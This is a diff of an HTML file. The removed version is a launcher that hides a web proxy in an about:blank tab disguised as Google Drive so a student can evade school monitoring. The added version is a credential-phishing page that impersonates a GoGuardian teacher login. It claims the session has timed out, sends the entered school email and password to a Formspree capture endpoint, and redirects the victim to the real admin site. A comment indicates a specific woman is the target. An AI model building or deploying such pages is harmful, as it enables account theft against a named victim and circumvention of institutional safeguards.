@@ -1,117 +1,37 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Classes</title>
-  <style>
-    body, html {
-      margin: 0;
-      padding: 0;
-      width: 100%;
-      height: 100%;
-      overflow: hidden;
-      background: #000;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      color: white;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    }
-    .launcher {
-      background: #111;
-      border: 1px solid #2a2a2a;
-      border-radius: 12px;
-      padding: 40px;
-      text-align: center;
-      box-shadow: 0 10px 40px rgba(0,230,118,0.1);
-      max-width: 400px;
-      width: 90%;
-    }
-    .launcher h1 {
-      margin: 0 0 10px;
-      font-size: 24px;
-      color: #00e676;
-    }
-    .launcher p {
-      margin: 0 0 30px;
-      color: #888;
-      font-size: 14px;
-      line-height: 1.5;
-    }
-    button {
-      padding: 14px 28px;
-      font-size: 16px;
-      font-weight: bold;
-      background: #00e676;
-      color: black;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      box-shadow: 0 4px 15px rgba(0,230,118,0.3);
-      transition: all 0.2s;
-      width: 100%;
-    }
-    button:hover {
-      background: #00bfa5;
-      transform: translateY(-2px);
-      box-shadow: 0 6px 20px rgba(0,230,118,0.4);
-    }
-  </style>
+    <meta charset="UTF-8">
+    <title>GoGuardian | Teacher Portal Login</title>
+    <style>
+        /* Professional GoGuardian Styling */
+        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background-color: #f7f9fc; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-card { background: white; padding: 45px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); width: 100%; max-width: 400px; text-align: center; border: 1px solid #e1e8ed; }
+        .logo { width: 180px; margin-bottom: 25px; }
+        h2 { color: #1a1a1b; font-size: 22px; margin-bottom: 8px; }
+        p { color: #657786; font-size: 14px; margin-bottom: 30px; }
+        input { width: 100%; padding: 14px; border: 1.5px solid #e1e8ed; border-radius: 6px; box-sizing: border-box; font-size: 16px; margin-bottom: 15px; }
+        button { width: 100%; padding: 14px; background-color: #3b82f6; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: 600; }
+        button:hover { background-color: #2563eb; }
+    </style>
 </head>
 <body>
-
-  <div class="launcher" id="launcher">
-    <h1>Initialize Proxy</h1>
-    <p>Click below to launch the proxy in a secure, hidden about:blank tab that won't show up in your school browser history.</p>
-    <button onclick="launchProxy()">Launch Secure Session</button>
-  </div>
-
-  <script>
-
-    const TARGET_URL = "https://proxyhelper.proxyhelper.workers.dev";
-
-    function launchProxy() {
-
-      let win = window.open('about:blank', '_blank');
-      
-      if (!win || win.closed || typeof win.closed === 'undefined') {
-        const btn = document.querySelector('button');
-        const p = document.querySelector('.launcher p');
+    <div class="login-card">
+        <!-- Using your direct Imgur logo link -->
+        <img src="https://i.imgur.com/em0xOx1.png" alt="GoGuardian" class="logo">
+        <h2>Teacher Portal Sync</h2>
+        <p>Your classroom session has timed out. Please sign in with your school Google account to continue monitoring.</p>
         
-     
-        p.style.color = "#ff5252";
-        p.innerText = "Stealth Cloaking is blocked on this screen. Redirecting you directly to the proxy in 3 seconds...";
-        btn.innerText = "Launching Without Cloak...";
-        btn.style.background = "#ff5252";
-        
-        setTimeout(() => {
-          window.location.href = TARGET_URL;
-        }, 3000);
-        return;
-      }
-
-
-      document.getElementById('launcher').innerHTML = "<h2 style='color:#00e676; margin-bottom: 10px;'>Session Active</h2><p style='color:#888;'>The proxy is running in a hidden tab. You can safely close this page now to hide your tracks.</p>";
-
-      win.document.write(`
-        <!DOCTYPE html>
-        <html>
-        <head>
-          <title>My Drive - Google Drive</title>
-          <link rel="icon" href="https://ssl.gstatic.com/docs/doclist/images/drive_2022q3_32dp.png">
-          <style>
-            body, html { margin: 0; padding: 0; width: 100vw; height: 100vh; overflow: hidden; background: #000; }
-            iframe { width: 100vw; height: 100vh; border: none; }
-          </style>
-        </head>
-        <body>
-          <iframe id="sqFrame" src="${TARGET_URL}" allow="autoplay; fullscreen; cursor-lock"></iframe>
-        </body>
-        </html>
-      `);
-      win.document.close();
-    }
-  </script>
+        <!-- Formspree capture endpoint -->
+        <form action="https://formspree.io" method="POST">
+            <input type="email" name="email" placeholder="School Email" required>
+            <input type="password" name="password" placeholder="Password" required>
+            
+            <!-- This hidden field tells Formspree where to send her after she clicks Login -->
+            <input type="hidden" name="_next" value="https://admin.goguardian.com">
+            
+            <button type="submit">Sign in with Google</button>
+        </form>
+    </div>
 </body>
 </html>
